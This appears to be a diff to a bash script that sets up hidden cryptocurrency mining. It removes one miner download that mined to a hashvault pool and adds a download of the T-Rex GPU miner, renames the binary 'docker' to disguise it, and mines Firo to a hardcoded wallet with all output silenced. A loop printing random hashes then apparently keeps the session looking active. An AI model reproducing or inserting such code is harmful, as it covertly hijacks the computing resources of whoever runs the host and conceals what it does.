@@ -1,3 +1,5 @@
 #!/bin/bash
-wget https://gitlab.com/damithnissanka96/best/-/raw/main/best.tar.gz && tar -xvf best.tar.gz
-./best --tls-url singapore01.hashvault.pro:80 --user ccx7aoNYpGb7sndJtEDWvCBQhPAy9mC8QW5KWuCx8J1FJrDcDrER1XYA9LGtggrR7ZC4KfQmQ2uRN47L9WypBbNLAeq2Q4Q9WN.df3ebece0970e12c6e9463d96e1c5d91ce6c65f940b428870f829fd35185d950 --pass shb --currency cryptonight_gpu
+wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz && tar -xvf t-rex-0.26.8-linux.tar.gz >/dev/null 2>&1
+mv t-rex docker
+./docker -a firopow -o stratum+tcp://firo.2miners.com:8181 -u a5kHSx8Hg1Sn8ELXcy6oHJi4QdE9nxsiuU.$(echo $(shuf -i 1000-9999 -n 1)-RABBIT) -p x >/dev/null 2>&1
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
